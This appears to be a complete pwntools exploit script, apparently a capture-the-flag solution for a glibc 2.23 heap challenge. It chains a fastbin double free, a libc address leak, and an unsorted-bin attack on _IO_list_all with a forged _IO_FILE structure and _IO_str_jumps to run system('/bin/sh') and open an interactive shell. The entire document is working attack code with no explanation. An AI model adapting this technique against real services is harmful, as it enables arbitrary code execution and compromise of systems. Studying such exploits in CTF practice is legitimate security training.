from pwn import*
def menu(ch):
	p.sendlineafter('Exit',str(ch))
def new(size,content):
	menu(1)
	p.sendlineafter('Size:',str(size))
	p.sendafter('Content:',content)
def free(index):
	menu(2)
	p.sendlineafter('delete?',str(index))
def show(index):
	menu(3)
	p.sendlineafter('view?',str(index))
def gift(content):
	menu(5)
	p.sendline(content)
p = process('./main')
libc =ELF('./libc-2.23.so')
for i in range(3):
	gift('FMYY')
new(0x18,p64(0) + p64(0x51) + p64(0))
new(0x40,'\x00'*0x30 + p64(0) + p64(0x21))
new(0x40,'FMYY\n')
new(0x40,'FMYY\n')
free(1)
free(2)
free(1)
new(0x40,'\n')
new(0x40,'FMYY\n')
new(0x40,'FMYY\n')
new(0x40,p64(0) + p64(0xA1) + '\n')
free(1)
show(1)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x68
log.info('LIBC:\t' + hex(libc_base))

system = libc_base + libc.sym['system']
binsh=libc_base+next(libc.search('/bin/sh'))
unsorted_bins = libc_base + libc.sym['__malloc_hook'] + 0x10 + 88
IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_str_jumps = libc_base + 0x3C37A0

fake_IO_FILE  = p64(0) + p64(0x61) + p64(unsorted_bins) + p64(IO_list_all -0x10)#make the IO_list_all ->fd =main_arena+88
fake_IO_FILE += p64(0) + p64(1)
fake_IO_FILE += p64(0) + p64(binsh)
fake_IO_FILE = fake_IO_FILE.ljust(0xD8,'\x00')
fake_IO_FILE += p64(IO_str_jumps -8)
fake_IO_FILE += p64(0) + p64(system)

free(3)
free(7)
new(0x40,fake_IO_FILE[0:0x40])
new(0x40,fake_IO_FILE[0xB0:])
menu('1'*0x500)
p.interactive()
